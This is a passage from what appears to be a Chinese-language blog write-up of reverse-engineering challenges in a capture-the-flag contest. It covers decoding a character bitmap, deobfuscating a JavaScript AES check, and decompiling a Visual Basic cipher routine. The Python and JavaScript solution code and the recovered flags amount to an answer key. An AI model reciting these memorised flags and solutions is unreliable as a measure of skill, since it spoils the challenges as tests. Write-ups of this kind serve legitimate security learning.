punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="75"></td><td><pre><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="76"></td><td><pre><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="77"></td><td><pre><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="78"></td><td><pre><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="79"></td><td><pre><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="80"></td><td><pre><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="81"></td><td><pre><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="82"></td><td><pre><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="83"></td><td><pre><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="84"></td><td><pre><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="85"></td><td><pre><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="86"></td><td><pre></pre></td></tr><tr><td data-num="87"></td><td><pre>str_array_8020 <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> line <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> matrix_8020<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="88"></td><td><pre></pre></td></tr><tr><td data-num="89"></td><td><pre><span class="token comment"># print(str_array_8020)</span></pre></td></tr><tr><td data-num="90"></td><td><pre></pre></td></tr><tr><td data-num="91"></td><td><pre><span class="token keyword">for</span> line <span class="token keyword">in</span> str_array_8020<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="92"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="93"></td><td><pre>        <span class="token keyword">if</span> small_alpha_bet<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> line<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="94"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="95"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="96"></td><td><pre>        <span class="token keyword">if</span> upper_alpha_bet<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> line<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="97"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="98"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="99"></td><td><pre>        <span class="token keyword">if</span> num_bet<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> line<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="100"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>结果为</p><figure class="highlight plain"><figcaption data-lang="plain"></figcaption><table><tr><td data-num="1"></td><td><pre>M O U N D W H I 7 e c r a B s</pre></td></tr></table></figure><p>由此得到 flag</p><p><code>W4terCTF&#123;1E7_US_drAW_a_plC7ur3_WITH_MA7Rix_4nd_MOUND_WHI7e_craBs&#125;</code></p><h2 id="doudou"><a class="anchor" href="#doudou">#</a> DouDou</h2><p>爬了 js 下来，用了 <code>restringer</code> 反混淆，得到关键函数如下：</p><figure class="highlight js"><figcaption data-lang="JavaScript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token parameter">q</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token keyword">var</span> <span class="token constant">V</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> <span class="token constant">P</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token constant">P</span> <span class="token operator">&lt;</span> <span class="token number">12</span><span class="token punctuation">;</span> <span class="token constant">P</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    x<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="6"></td><td><pre>      <span class="token function">e</span><span class="token punctuation">(</span>q<span class="token punctuation">[</span><span class="token constant">P</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">g</span><span class="token punctuation">)</span> <span class="token operator">=></span> g<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  x <span class="token operator">=</span> x<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> r <span class="token operator">+</span> <span class="token constant">A</span> <span class="token operator">+</span> s <span class="token operator">+</span> y <span class="token operator">+</span> <span class="token constant">B</span> <span class="token operator">+</span> <span class="token constant">F</span> <span class="token operator">+</span> w <span class="token operator">+</span> <span class="token constant">Q</span> <span class="token operator">+</span> b <span class="token operator">+</span> p <span class="token operator">+</span> i <span class="token operator">+</span> f<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token comment">// ...</span></pre></td></tr></table></figure><p>最后 <code>x == ...</code> 后面的表达式也求出来了，是一个超长 16 进制字符串，太长不贴了。</p><p>分析前面调用 <code>check(STEPS)</code> 的环节可以得到， <code>q</code> 会是一个 <code>[[int * 16] * 12]</code> ，而函数 <code>e</code> ，结合 hint 最终判断为 AES 加密，key 是 <code>W4terDr0pCTF2024</code> ，但是还没完，加密之前每个字节要先异或一个 <code>153</code> 。</p><p>最后生成的 <code>x</code> 要等于那个超长字符串，才会进入 if 内生成 flag 的过程，得到 flag：</p><figure class="highlight js"><figcaption data-lang="JavaScript"></figcaption><table><tr><td data-num="1"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    res <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> <span class="token constant">P</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token constant">P</span> <span class="token operator">&lt;</span> <span class="token number">12</span><span class="token punctuation">;</span> <span class="token constant">P</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>      res <span class="token operator">+=</span> <span class="token constant">V</span><span class="token punctuation">[</span><span class="token constant">P</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">g</span><span class="token punctuation">)</span> <span class="token operator">=></span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    res <span class="token operator">=</span> res<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> <span class="token constant">P</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token constant">P</span> <span class="token operator">&lt;</span> res<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token constant">P</span> <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>      flag <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token constant">P</span><span class="token punctuation">,</span> <span class="token constant">P</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>大概就是 res 四个一组，parse 成一个四位四进制整数，再转 ascii 即可。这也就意味着 <code>res</code> 必须是 <code>^[0123]*$</code> ，这也可以检验得到 res 的过程是否正确，反正我们一次就出来了：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>final_x <span class="token operator">=</span> <span class="token string">"91d48f9e77505fe36b1537597d68a8be6ef1ced09bba7c9d4ea6a123042d47bbd5776d7b85eebbb7738de44b9af45f9b706640c8dac77d409ceb067e677e7290401e4852527e119b8095a636d0b628e1161142b7dfcbcf2ef890698ba5d279c78df2348e45d1aef635ebfb841284f6d67d1e9d0f0489bcdc5ba303bc791d0e18e46889fa856a463907d82a8137b7b2a863d1896d4dfcd6b84a2f55b50567f705ea7177187609da2e506182007b7e8244acf62c69de4f511760159ffc6dd8e9f5"</span></pre></td></tr><tr><td data-num="2"></td><td><pre>aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">b"W4terDr0pCTF2024"</span><span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">while</span> final_x<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    part_s <span class="token operator">=</span> final_x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    final_x <span class="token operator">=</span> final_x<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    l2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">while</span> part_s<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>part_s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        l2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        part_s <span class="token operator">=</span> part_s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>l2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>x <span class="token operator">^</span> <span class="token number">153</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> subl<span class="token punctuation">]</span> <span class="token keyword">for</span> subl <span class="token keyword">in</span> l<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="16"></td><td><pre>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>subl<span class="token punctuation">)</span> <span class="token keyword">for</span> subl <span class="token keyword">in</span> l<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="17"></td><td><pre>l <span class="token operator">=</span> <span class="token punctuation">[</span>aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> l<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>ans <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">for</span> s <span class="token keyword">in</span> l<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">while</span> s<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        s <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        ans <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>ans</pre></td></tr></table></figure><pre><code>'jS_ls_In7erEStlng_ANd_QuaTeRN4rY_IS_al50_1Unny!!'
</code></pre><h2 id="古老的语言"><a class="anchor" href="#古老的语言">#</a> 古老的语言</h2><p>用 VB 反编译器逆向，关键函数 <code>Fxxxtel</code> 如下：</p><figure class="highlight vb"><figcaption data-lang="Visual Basic"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">Public</span> <span class="token keyword">Function</span> Fxxxtel<span class="token punctuation">(</span>raw<span class="token punctuation">)</span> <span class="token comment">'40F35C</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token comment">'Data Table: 40E3A8</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">Dim</span> var_B0 <span class="token keyword">As</span> <span class="token keyword">Long</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">Dim</span> var_B4 <span class="token keyword">As</span> <span class="token keyword">Long</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">Dim</span> var_B8 <span class="token keyword">As</span> <span class="token keyword">Long</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">Dim</span> var_BC <span class="token keyword">As</span> <span class="token keyword">Long</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">Dim</span> var_86 <span class="token keyword">As</span> <span class="token keyword">Integer</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  loc_40F031<span class="token punctuation">:</span> <span class="token keyword">For</span> var_AC <span class="token operator">=</span> <span class="token number">0</span> <span class="token keyword">To</span> <span class="token number">9</span> <span class="token keyword">Step</span> <span class="token number">3</span><span class="token punctuation">:</span> var_A6 <span class="token operator">=</span> var_AC <span class="token comment">'Integer</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  loc_40F047<span class="token punctuation">:</span>   var_B4 <span class="token operator">=</span> raw<span class="token punctuation">(</span><span class="token keyword">CLng</span><span class="token punctuation">(</span>var_A6<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  loc_40F055<span class="token punctuation">:</span>   var_B8 <span class="token operator">=</span> raw<span class="token punctuation">(</span><span class="token keyword">CLng</span><span class="token punctuation">(</span><span class="token punctuation">(</span>var_A6 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  loc_40F063<span class="token punctuation">:</span>   var_BC <span class="token operator">=</span> raw<span class="token punctuation">(</span><span class="token keyword">CLng</span><span class="token punctuation">(</span><span class="token punctuation">(</span>var_A6 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  loc_40F06D<span class="token punctuation">:</span>   <span class="token keyword">For</span> var_C0 <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">To</span> <span class="token number">&amp;H20</span><span class="token punctuation">:</span> var_A8 <span class="token operator">=</span> var_C0 <span class="token comment">'Integer</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  loc_40F089<span class="token punctuation">:</span>     var_B0 <span class="token operator">=</span> AddLong<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1640531527</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  loc_40F0FB<span class="token punctuation">:</span>     var_B4 <span class="token operator">=</span> var_B4 <span class="token keyword">Xor</span> AddLong<span class="token punctuation">(</span>AddLong<span class="token punctuation">(</span>LeftRotateLong<span class="token punctuation">(</span>var_B8<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">Xor</span> <span class="token 